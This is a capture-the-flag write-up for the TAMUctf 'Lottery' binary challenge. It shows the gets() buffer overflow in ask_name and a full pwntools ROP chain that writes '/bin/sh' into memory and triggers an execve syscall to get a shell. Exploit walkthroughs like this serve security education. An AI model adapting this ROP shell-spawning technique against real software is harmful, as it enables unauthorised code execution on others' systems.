# Challenge Name : Lottery

Description : 
Attack the binary and get the flag!

We can connect with : 
```openssl s_client -connect tamuctf.com:443 -servername lottery -quiet```

* The first thing to do here might be to check for file info.

```lottery: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped```
* Since it is statically linked, the possibility of a ret2libc attack is eliminated.
* Another look into checksec would reveal that ```NX``` is enabled. 
* With NX enabled, we may not be able to inject a shellcode either. 

Initially, while running the program, we are prompted with three options, enter numbers, check numbers and enter name. However a look into check_numbers() in gdb reveals that entering the correct numbers is not enough to print the flag.
However we can see that ask_name() contains gets. Making use of this vulnerability we can make a syscall.

* Disasssembly of ask_name : 

```0x0000000000401470 <+0>:	push   rbp
   0x0000000000401471 <+1>:	xor    eax,eax
   0x0000000000401473 <+3>:	sub    rsp,0x40
   0x0000000000401477 <+7>:	mov    rbp,rsp
   0x000000000040147a <+10>:	mov    rdi,rbp
   0x000000000040147d <+13>:	call   0x401b34 <gets>
   0x0000000000401482 <+18>:	mov    rsi,rbp
   0x0000000000401485 <+21>:	lea    rdi,[rip+0x7bad]        # 0x409039
   0x000000000040148c <+28>:	xor    eax,eax
   0x000000000040148e <+30>:	call   0x401bd3 <printf>
   0x0000000000401493 <+35>:	add    rsp,0x40
   0x0000000000401497 <+39>:	pop    rbp
   0x0000000000401498 <+40>:	ret    
```
The buffer size defined is 0x48 bytes, but since gets is used, there is no limit to our input.
To do the syscall, we can make use of ROPgadgets and the following code :

# Python script :
```
from pwn import *

p = remote('localhost', 4444)
buf = 'a'*0x48
syscall = p64(0x00000000004016f9)
pop_rax = p64(0x000000000040100b)
pop_rdi = p64(0x401253)
pop_rsi = p64(0x4018ad)
pop_rdx = p64(0x0000000000401255)
mov_qword_ptr_rdi_rax = p64(0x401f37)

buf += pop_rax + p64(0x0068732f6e69622f) + pop_rdi + p64(0x40c730) + mov_qword_ptr_rdi_rax

buf += pop_rax + p64(0x3b)
buf += pop_rdi + p64(0x40c730)
buf += pop_rsi + p64(0x00) + pop_rdx + p64(0x00) + syscall


p.recvuntil("Action: ")
p.sendline('3')
p.sendline(buf)
p.interactive()
```

